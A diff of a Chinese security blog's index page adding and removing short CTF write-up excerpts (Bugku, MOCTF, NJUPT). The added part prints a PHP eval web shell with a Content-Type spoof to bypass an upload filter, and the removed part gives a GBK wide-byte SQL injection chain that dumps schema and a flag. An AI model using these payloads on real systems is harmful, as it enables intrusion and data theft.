@@ -98,6 +98,47 @@
         <div class="content-wrapper">
           <div id="content" class="content"><section id="posts" class="posts"><article class="post">
     <header class="post-header">
+      <h1 class="post-title"><a class="post-link" href="/2019/11/18/Bugku-Web/">Bugku-Web</a>
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-11-18
+        </span><span class="post-category">
+            <a href="/categories/WP/">WP</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-content"><h3 id="web2"><a href="#web2" class="headerlink" title="#web2"></a>#web2</h3><p>F12查看网页源代码得到Flag<br>KEY{Web-2-bugKssNNikls9100}</p>
+<h3 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="#文件上传测试"></a>#文件上传测试</h3><p>要求上传php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>抓包 提示：非图片文件<br>修改<code>Content-Type: image/png</code><br><img src="/images/pasted-140.png" alt="upload successful">Flag:42e97d465f962c53df9549377b513c7e</p>
+          <div class="read-more">
+            <a href="/2019/11/18/Bugku-Web/" class="read-more-link">Read more..</a>
+          </div>
+        </div></article>
+      <article class="post">
+    <header class="post-header">
+      <h1 class="post-title"><a class="post-link" href="/2019/11/18/MOCTF-%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/">MOCTF-新春欢乐赛</a>
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-11-18
+        </span><span class="post-category">
+            <a href="/categories/WP/">WP</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-content"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="是时候让你手指锻炼一下了"><a href="#是时候让你手指锻炼一下了" class="headerlink" title="#是时候让你手指锻炼一下了"></a>#是时候让你手指锻炼一下了</h3><p>代码审计<br><img src="/images/pasted-136.png" alt="upload successful"><br>构造payload ?clicks=108000<br>moctf{Here_Is_Your_Surprise}</p>
+          <div class="read-more">
+            <a href="/2019/11/18/MOCTF-%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/" class="read-more-link">Read more..</a>
+          </div>
+        </div></article>
+      <article class="post">
+    <header class="post-header">
       <h1 class="post-title"><a class="post-link" href="/2019/10/27/Bugku-Misc/">Bugku-Misc</a>
         </h1>
 
@@ -255,48 +296,6 @@
     <div class="post-content"><p>#实质<br>unicode编码缺陷导致同一代码的多重含义，导致操作系统对代码的错误解析。典型案例：%c0%ae会被识别为./<br>参考：<a href="https://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode#Description" target="_blank" rel="noopener">https://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode#Description</a></p>
           <div class="read-more">
             <a href="/2019/10/23/GlassFish/" class="read-more-link">Read more..</a>
-          </div>
-        </div></article>
-      <article class="post">
-    <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2019/10/23/%E5%AD%A6%E6%9C%AF%E5%AE%89%E5%85%A8/">学术安全</a>
-        </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2019-10-23
-        </span><span class="post-category">
-            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
-            </span>
-        </div>
-    </header>
-
-    <div class="post-content"><h3 id="多host头"><a href="#多host头" class="headerlink" title="#多host头"></a>#多host头</h3><p>发送带有多 Host 的http 请求，downstream 与 upstream 可能理解成不同的 host地址，此情况出现条件较为复杂</p>
-<h3 id="Host头增加前后空格"><a href="#Host头增加前后空格" class="headerlink" title="#Host头增加前后空格"></a>#Host头增加前后空格</h3><p>不同系统对空格理解不一致，歧义再次产生<br>request uri是绝对路径</p>
-<h3 id="绝对路径被当作相对路径解析"><a href="#绝对路径被当作相对路径解析" class="headerlink" title="#绝对路径被当作相对路径解析"></a>#绝对路径被当作相对路径解析</h3><p>当Absoult-URL与Host同时出现时，除了akamai大多数遵循RFC<br>造成攻击</p>
-          <div class="read-more">
-            <a href="/2019/10/23/%E5%AD%A6%E6%9C%AF%E5%AE%89%E5%85%A8/" class="read-more-link">Read more..</a>
-          </div>
-        </div></article>
-      <article class="post">
-    <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2019/10/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%89%8B%E6%B3%A8/">记一次手注</a>
-        </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2019-10-23
-        </span><span class="post-category">
-            <a href="/categories/SQL/">SQL</a>
-            <a href="/categories/SQL/Web/">Web</a>
-            </span>
-        </div>
-    </header>
-
-    <div class="post-content"><p>手注爆库用户信息 题目来源NJUPT平台</p>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="#步骤"></a>#步骤</h3><p>题目来自NJUPT平台 <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a><br>1.<code>id=2</code> 得到Tips：<code>gbk_sql_injection</code>宽字节注入<br>2.<code>id=%df%27 or 1 = 1%23 your sql:select id,title from news where id = ‘運’ or 1 = 1#’</code><br>3.<br><code>id=%df%27 union select 1,database() from news%23</code>爆出库名 <code>sae-chinalover</code>/<br><code>id=%df%27 and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1--+%23</code>也可以 然后<code>sae-chinalover</code>十六进制转换为 <code>0x7361652D6368696E616C6F766572</code><br>4.<code>id=%df%27 and 1=2 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7361652D6368696E616C6F766572%23</code><br>爆出表名 <code>ctf</code>,<code>ctf2</code>,<code>ctf3</code>,<code>ctf4</code>,<code>news</code><br>十六进制转换分别为<code>0x637466</code>，<code>0x63746632</code>，<code>0x63746633</code>，<code>0x63746634</code>，<code>0x6E657773</code><br>5.<code>id=%df%27 and 1=2 union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x637466%23/0x63746632/0x63746633/0x63746634/0x6E657773</code>最后在表<code>ctf4</code>中得到<code>flag</code>字段<br>6.<br><code>id=%df%27 and 1=2 union select 1,group_concate(flag) from ctf4</code>得到Flag：nctf{gbk_3sqli}</p>
-          <div class="read-more">
-            <a href="/2019/10/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%89%8B%E6%B3%A8/" class="read-more-link">Read more..</a>
           </div>
         </div></article>
       <nav class="pagination"><a class="prev" href="/page/3/">
